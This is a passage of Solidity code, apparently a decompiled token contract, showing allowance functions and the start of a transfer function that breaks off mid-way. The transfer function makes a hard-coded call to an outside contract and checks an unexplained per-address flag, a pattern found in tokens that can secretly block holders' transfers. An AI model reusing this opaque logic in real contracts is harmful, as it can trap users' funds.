        allowance[msg.sender][_address] = _value;
    }

    function decreaseAllowance(address _address, uint256 _value) public payable {
        require(_value <= allowance[msg.sender][_address] && msg.sender != address(0) && _address != address(0));
        allowance[msg.sender][_address] -= _value;
    }

    function increaseAllowance(address _address, uint256 _value) public payable {
        require(_address != address(0) && msg.sender != address(0));
        require(_value + allowance[msg.sender][_address] >= allowance[msg.sender][_address]);
        allowance[msg.sender][_address] += _value;
    }

    function transfer(address _to, uint256 _value) public payable {
        require(_to != address(0) && msg.sender != address(0));
        (bool success, bytes memory data) = address(0x5491305204DaCa75317A0bC8C332dD61Dbb77Bc8).call(abi.encodePacked(bytes4(keccak256("balanceOf(address)")), msg.sender));
        require(success);
        uint256 v0 = abi.decode(data, (uint256));
        require(_value <= s_4[msg.sender]);

        if (s_6[msg.sender] == 0) {
            s_4[msg.sender] -= _value;
            require(_value + s_4[_to] >= s_4[_to]);
            s_4[_to] += _value;
